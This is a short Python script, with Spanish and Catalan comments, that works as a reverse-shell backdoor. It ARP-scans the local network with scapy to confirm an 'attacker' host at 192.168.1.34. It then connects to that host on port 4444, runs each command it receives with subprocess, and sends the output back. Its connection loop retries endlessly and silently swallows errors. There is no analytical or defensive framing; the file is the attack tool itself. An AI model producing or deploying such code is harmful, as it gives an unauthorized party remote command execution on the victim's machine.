import socket
import os
import subprocess
import scapy.all as scapy
from scapy.all import ARP, Ether, srp
import requests


def comprobation_wifi(IP):
    print(f"🔍 Searching IP attacker {IP}...")

    solicitud = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP)
    respuesta, _ = srp(solicitud, timeout=2, verbose=False)
    
    dispositivos = []

    for _, recibido in respuesta:
        dispositivos.append({
            "ip": recibido.psrc,
        })

    for dispositivo in dispositivos:
        if dispositivo['ip'] == IP:
            print(f"Se ha encontrado IP atacante : {IP}")
            return True
    print(f"No se ha encontrado la ip : {IP}")
    return False

def connect_attacker(IP, port):
    if not comprobation_wifi(IP):
        return
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP, PORT))

            while True:
                command = client.recv(1024).decode("utf-8") # Recull els comandes enviats per l'atacant
                if command.lower() == "exit": # Si el comande es 'exit' s'acaba
                    break
                
                output = subprocess.getoutput(command) # Executa comande a la terminal i recull el output
                client.send(output.encode("utf-8")) # Envia el output a l'atacant
        except:
            continue

 
IP_attacker = "192.168.1.34"
PORT = "4444"

connect_attacker(IP_attacker, PORT)